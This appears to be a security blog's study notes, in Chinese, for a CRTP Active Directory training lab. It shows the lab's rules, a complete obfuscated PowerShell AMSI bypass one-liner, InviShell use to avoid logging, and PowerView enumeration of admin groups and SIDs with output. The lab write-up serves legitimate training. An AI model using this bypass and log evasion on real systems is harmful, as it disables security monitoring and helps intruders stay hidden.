rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/spn/" rel="tag">spn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sysctl/" rel="tag">sysctl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/08/29/wiz-2025-cloudsecuritychampionship-3/" title="【Wiz 2025】Breaking The Barriers" >
            <div class="recent-link-text">
              【Wiz 2025】Breaking The Barriers
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/11/wiz-2025-cloudsecuritychampionship-2/" title="【Wiz 2025】Contain Me If You Can" >
            <div class="recent-link-text">
              【Wiz 2025】Contain Me If You Can
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/14/htb-wp-Outbound/" title="【season-8】 htb Outbound wp" >
            <div class="recent-link-text">
              【season-8】 htb Outbound wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/11/Tracks-AD-Coder/" title="Tracks-AD-Coder" >
            <div class="recent-link-text">
              Tracks-AD-Coder
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/06/htb-wp-Voleur/" title="【season-8】 htb Voleur wp" >
            <div class="recent-link-text">
              【season-8】 htb Voleur wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lab%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">lab要注意的点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%88%B0%E5%AE%9E%E9%AA%8C%E5%AE%A4"><span class="toc-number">1.1.</span> <span class="toc-text">连接到实验室</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lab-flag"><span class="toc-number">2.</span> <span class="toc-text">lab flag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-1"><span class="toc-number">2.1.</span> <span class="toc-text">Learning Objective - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-2"><span class="toc-number">2.2.</span> <span class="toc-text">Learning Objective - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-3"><span class="toc-number">2.3.</span> <span class="toc-text">Learning Objective - 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BAOU%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9C%BA%E5%99%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text">列出OU组中的机器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEGPO%E7%9A%84acl"><span class="toc-number">2.3.2.</span> <span class="toc-text">枚举GPO的acl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-4"><span class="toc-number">2.4.</span> <span class="toc-text">Learning Objective - 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-5"><span class="toc-number">2.5.</span> <span class="toc-text">Learning Objective - 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-5-1"><span class="toc-number">2.6.</span> <span class="toc-text">Learning Objective - 5	- 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-5-2"><span class="toc-number">2.7.</span> <span class="toc-text">Learning Objective - 5 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-5-3"><span class="toc-number">2.8.</span> <span class="toc-text">Learning Objective - 5 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-6-1"><span class="toc-number">2.9.</span> <span class="toc-text">Learning Objective - 6 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-7-1"><span class="toc-number">2.10.</span> <span class="toc-text">Learning Objective - 7 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-7-2"><span class="toc-number">2.11.</span> <span class="toc-text">Learning Objective - 7 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-7-3"><span class="toc-number">2.12.</span> <span class="toc-text">Learning Objective - 7 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-7-4"><span class="toc-number">2.13.</span> <span class="toc-text">Learning Objective - 7 - 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-7-5"><span class="toc-number">2.14.</span> <span class="toc-text">Learning Objective - 7 - 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-7-6"><span class="toc-number">2.15.</span> <span class="toc-text">Learning Objective - 7 - 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%97%ADapplocker"><span class="toc-number">2.16.</span> <span class="toc-text">关闭applocker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-8-1"><span class="toc-number">2.17.</span> <span class="toc-text">Learning Objective - 8 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-8-2"><span class="toc-number">2.18.</span> <span class="toc-text">Learning Objective - 8 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%91%E7%A5%A8-golden-ticket"><span class="toc-number">2.19.</span> <span class="toc-text">金票 golden ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-9-1"><span class="toc-number">2.20.</span> <span class="toc-text">Learning Objective - 9 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-10-1"><span class="toc-number">2.21.</span> <span class="toc-text">Learning Objective - 10 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-11-1"><span class="toc-number">2.22.</span> <span class="toc-text">Learning Objective - 11	- 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-12-1"><span class="toc-number">2.23.</span> <span class="toc-text">Learning Objective - 12	- 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-13-1"><span class="toc-number">2.24.</span> <span class="toc-text">Learning Objective - 13 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-14-1"><span class="toc-number">2.25.</span> <span class="toc-text">Learning Objective - 14	- 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-15-1"><span class="toc-number">2.26.</span> <span class="toc-text">Learning Objective - 15 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-15-2"><span class="toc-number">2.27.</span> <span class="toc-text">Learning Objective - 15 - 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E6%A0%B9%E5%9F%9F%E7%AE%A1%E7%90%86"><span class="toc-number">2.27.1.</span> <span class="toc-text">拿根域管理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-16-1"><span class="toc-number">2.28.</span> <span class="toc-text">Learning Objective - 16 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-16-2"><span class="toc-number">2.29.</span> <span class="toc-text">Learning Objective - 16 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-17-1"><span class="toc-number">2.30.</span> <span class="toc-text">Learning Objective - 17 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-18-1"><span class="toc-number">2.31.</span> <span class="toc-text">Learning Objective - 18 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-19-1"><span class="toc-number">2.32.</span> <span class="toc-text">Learning Objective - 19 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-20-1"><span class="toc-number">2.33.</span> <span class="toc-text">Learning Objective - 20 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-20-2"><span class="toc-number">2.34.</span> <span class="toc-text">Learning Objective - 20 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-21-1"><span class="toc-number">2.35.</span> <span class="toc-text">Learning Objective - 21 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-21-2"><span class="toc-number">2.36.</span> <span class="toc-text">Learning Objective - 21	- 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-21-3"><span class="toc-number">2.37.</span> <span class="toc-text">Learning Objective - 21 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-21-4"><span class="toc-number">2.38.</span> <span class="toc-text">Learning Objective - 21	- 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-22-1"><span class="toc-number">2.39.</span> <span class="toc-text">Learning Objective - 22	- 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-22-2"><span class="toc-number">2.40.</span> <span class="toc-text">Learning Objective - 22 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-22-3"><span class="toc-number">2.41.</span> <span class="toc-text">Learning Objective - 22 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objective-22-4"><span class="toc-number">2.42.</span> <span class="toc-text">Learning Objective - 22 - 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EUROCORP-LOCAL"><span class="toc-number">2.43.</span> <span class="toc-text">EUROCORP.LOCAL</span></a></li></ol></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-crtp-lab-note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmbjpszso00cmq8kydxbic42z">
        <img src="/wpimages/2025/crtp-lab-note/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        crtp-study-lab-note
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-05-21T10:41:34.000Z" itemprop="datePublished">2025-05-21</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
    Uncategorized 
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            199k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="lab要注意的点"><a href="#lab要注意的点" class="headerlink" title="lab要注意的点"></a>lab要注意的点</h1><blockquote>
<p>您可以使用网页浏览器或 OpenVPN 客户端访问本实验。更多详情， 请参阅“连接到实验”文档。</p>
</blockquote>
<blockquote>
<p>课程中使用的所有工具均可 在学生电脑的 C:\AD\Tools.zip中找到。您可以自由选择使用自己喜欢的工具。</p>
</blockquote>
<blockquote>
<p>除非另有说明，所有基于 PowerShell 的工具（尤其是用于枚举的工具）均使用 InviShell 执行，以避免冗长的日志记录。像 Rubeus.exe 这样的二进制文件在 InviShell 中使用时可能会出现不一致的情况，请从正常的命令提示符运行它们。</p>
</blockquote>
<blockquote>
<p>实验室每天都会恢复，以保持已知的良好状态。学生虚拟机不会恢复，但仍然请离线保存您的笔记！<br>实验手册使用特定于用户的资源术语。例如，如果您看到 ，studentx并且您的用户 ID 是student41，则将其读作studentx、student41，supportxuser等等 support41user。</p>
</blockquote>
<blockquote>
<p>您的学生虚拟机主机名可以是dcorp-student x或dcorp-std x<br>当您运行反向 shell 的监听器时，请记住关闭或添加学生 VM 防火墙的例外。<br>C :\AD目录不受 Windows Defender 的保护，但 AMSI 可能会在加载某些工具时检测到它们。实验手册中使用了以下 AMSI 绕过方法：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S`eT-It`em ( &#x27;V&#x27;+&#x27;aR&#x27; +  &#x27;IA&#x27; + ((&quot;&#123;1&#125;&#123;0&#125;&quot;-f&#x27;1&#x27;,&#x27;blE:&#x27;)+&#x27;q2&#x27;)  + (&#x27;uZ&#x27;+&#x27;x&#x27;)  ) ( [TYpE](  &quot;&#123;1&#125;&#123;0&#125;&quot;-F&#x27;F&#x27;,&#x27;rE&#x27;  ) )  ;    (    Get-varI`A`BLE  ( (&#x27;1Q&#x27;+&#x27;2U&#x27;)  +&#x27;zX&#x27;  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&quot; -f(&#x27;Uti&#x27;+&#x27;l&#x27;),&#x27;A&#x27;,(&#x27;Am&#x27;+&#x27;si&#x27;),((&quot;&#123;0&#125;&#123;1&#125;&quot; -f &#x27;.M&#x27;,&#x27;an&#x27;)+&#x27;age&#x27;+&#x27;men&#x27;+&#x27;t.&#x27;),(&#x27;u&#x27;+&#x27;to&#x27;+(&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot; -f &#x27;ma&#x27;,&#x27;.&#x27;,&#x27;tion&#x27;)),&#x27;s&#x27;,((&quot;&#123;1&#125;&#123;0&#125;&quot;-f &#x27;t&#x27;,&#x27;Sys&#x27;)+&#x27;em&#x27;)  ) ).&quot;g`etf`iElD&quot;(  ( &quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot; -f(&#x27;a&#x27;+&#x27;msi&#x27;),&#x27;d&#x27;,(&#x27;I&#x27;+(&quot;&#123;0&#125;&#123;1&#125;&quot; -f &#x27;ni&#x27;,&#x27;tF&#x27;)+(&quot;&#123;1&#125;&#123;0&#125;&quot;-f &#x27;ile&#x27;,&#x27;a&#x27;))  ),(  &quot;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot; -f (&#x27;S&#x27;+&#x27;tat&#x27;),&#x27;i&#x27;,(&#x27;Non&#x27;+(&quot;&#123;1&#125;&#123;0&#125;&quot; -f&#x27;ubl&#x27;,&#x27;P&#x27;)+&#x27;i&#x27;),&#x27;c&#x27;,&#x27;c,&#x27;  )).&quot;sE`T`VaLUE&quot;(  $&#123;n`ULl&#125;,$&#123;t`RuE&#125; )</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果您想在获得本地管理员权限后关闭学生虚拟机上的 AV，请使用 GUI，因为防篡改保护会使“Set-MpPreference”命令失效。<br>请注意，我们使用的是公开可用工具的混淆版本。即使可执行文件的名称保持不变，该工具也经过了混淆。例如，实验室中的 Rubeus.exe 就是公开可用的 Rubeus 的混淆版本。<br>请注意，如果您收到任何可执行文件（Loader.exe、SafetyKatz.exe 或 Rubeus.exe）的类似“此应用程序无法在您的电脑上运行”的错误，请从C:\AD\Tools.zip 中重新提取它：</p>
</blockquote>
<h2 id="连接到实验室"><a href="#连接到实验室" class="headerlink" title="连接到实验室"></a>连接到实验室</h2><p>这里的 X 是用户ID. 如果id是student41, 那我的机器ip则是 172.16.100.41 以及用户名是<br>student41:</p>
<hr>
<p><img src="/wpimages/2025/crtp-lab-note/image-1.png" alt="alt text"></p>
<hr>
<h1 id="lab-flag"><a href="#lab-flag" class="headerlink" title="lab flag"></a>lab flag</h1><p>先执行一下 <code>inviShell</code> 绕一下日志之类的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-2.png" alt="alt text"></p>
<h2 id="Learning-Objective-1"><a href="#Learning-Objective-1" class="headerlink" title="Learning Objective - 1"></a>Learning Objective - 1</h2><blockquote>
<p>SID of the member of the Enterprise Admins group</p>
</blockquote>
<blockquote>
<p>Enterprise Admins 组成员的 SID</p>
</blockquote>
<p>加载powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. C:\AD\Tools\PowerView.ps1</span><br></pre></td></tr></table></figure>

<p>通过 <code>Get-DomainGroup</code> 筛选 name 中带有 “admin” 的组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522&gt; <span class="built_in">Get-DomainGroup</span> <span class="string">&quot;*admin*&quot;</span> |<span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">Administrators</span><br><span class="line">Hyper<span class="literal">-V</span> Administrators</span><br><span class="line">Storage Replica Administrators</span><br><span class="line">Domain Admins</span><br><span class="line">Key Admins</span><br><span class="line">DnsAdmins</span><br></pre></td></tr></table></figure>

<p>会发现没有 <code>Enterprise Admins (企业组)</code> 这是因为企业组只存在于林根，所以要指定林根域(domain)来枚举。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\student522&gt; Get-DomainGroup &quot;*admin*&quot; -Domain moneycorp.local|select name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line">----</span><br><span class="line">Administrators</span><br><span class="line">Hyper-V Administrators</span><br><span class="line">Storage Replica Administrators</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Domain Admins</span><br><span class="line">Key Admins</span><br><span class="line">Enterprise Key Admins</span><br><span class="line">DnsAdmins</span><br></pre></td></tr></table></figure>

<p>现在就能看到企业组了（狂喜）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522&gt; <span class="built_in">Get-DomainGroup</span> <span class="string">&quot; Enterprise Admins&quot;</span> <span class="literal">-Domain</span> moneycorp.local</span><br><span class="line"></span><br><span class="line">grouptype              : UNIVERSAL_SCOPE, SECURITY</span><br><span class="line">admincount             : <span class="number">1</span></span><br><span class="line">iscriticalsystemobject : True</span><br><span class="line">samaccounttype         : GROUP_OBJECT</span><br><span class="line">samaccountname         : Enterprise Admins</span><br><span class="line">whenchanged            : <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">01</span>:<span class="number">34</span> AM</span><br><span class="line">objectsid              : S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line">name                   : Enterprise Admins</span><br><span class="line">cn                     : Enterprise Admins</span><br><span class="line">instancetype           : <span class="number">4</span></span><br><span class="line">usnchanged             : <span class="number">12826</span></span><br><span class="line">dscorepropagationdata  : &#123;<span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">01</span>:<span class="number">34</span> AM, <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">46</span>:<span class="number">25</span> AM, <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">16</span> AM&#125;</span><br><span class="line">objectguid             : <span class="number">43</span>fb8531<span class="literal">-c434-4178-9348-eb9c6471bedb</span></span><br><span class="line">description            : Designated administrators of the enterprise</span><br><span class="line">memberof               : &#123;CN=Denied RODC Password Replication <span class="built_in">Group</span>,CN=Users,DC=moneycorp,DC=local, CN=Administrators,CN=Builtin,DC=moneycorp,DC=local&#125;</span><br><span class="line">member                 : CN=Administrator,CN=Users,DC=moneycorp,DC=local</span><br><span class="line">usncreated             : <span class="number">12339</span></span><br><span class="line">whencreated            : <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">46</span>:<span class="number">24</span> AM</span><br><span class="line">distinguishedname      : CN=Enterprise Admins,CN=Users,DC=moneycorp,DC=local</span><br><span class="line">objectclass            : &#123;top, <span class="built_in">group</span>&#125;</span><br><span class="line">objectcategory         : CN=<span class="built_in">Group</span>,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<p>现在通过 <code>Get-DomainGroupMember</code> 获取对应组员 sid</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522&gt; <span class="built_in">Get-DomainGroupMember</span> <span class="string">&quot;Enterprise Admins&quot;</span> <span class="literal">-Domain</span> moneycorp.local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GroupDomain             : moneycorp.local</span><br><span class="line">GroupName               : Enterprise Admins</span><br><span class="line">GroupDistinguishedName  : CN=Enterprise Admins,CN=Users,DC=moneycorp,DC=local</span><br><span class="line">MemberDomain            : moneycorp.local</span><br><span class="line">MemberName              : Administrator</span><br><span class="line">MemberDistinguishedName : CN=Administrator,CN=Users,DC=moneycorp,DC=local</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-335606122-960912869-3279953914-500</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>S-1-5-21-335606122-960912869-3279953914-500</p>
</blockquote>
<h2 id="Learning-Objective-2"><a href="#Learning-Objective-2" class="headerlink" title="Learning Objective - 2"></a>Learning Objective - 2</h2><blockquote>
<p>ActiveDirectory Rights for RDPUsers group on the users named ControlxUser</p>
</blockquote>
<blockquote>
<p>RDPUsers 组 对ControlxUser(我们初始控制的用户id) 用户对 ActiveDirectory 权限</p>
</blockquote>
<p>先拿一下sid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\student522&gt; (Get-DomainUser  -Name control522User).objectsid</span><br><span class="line">S-1-5-21-719815819-3726368948-3917688648-20702</span><br></pre></td></tr></table></figure>

<p>然后是 <code>rdpusers</code> 组id</p>
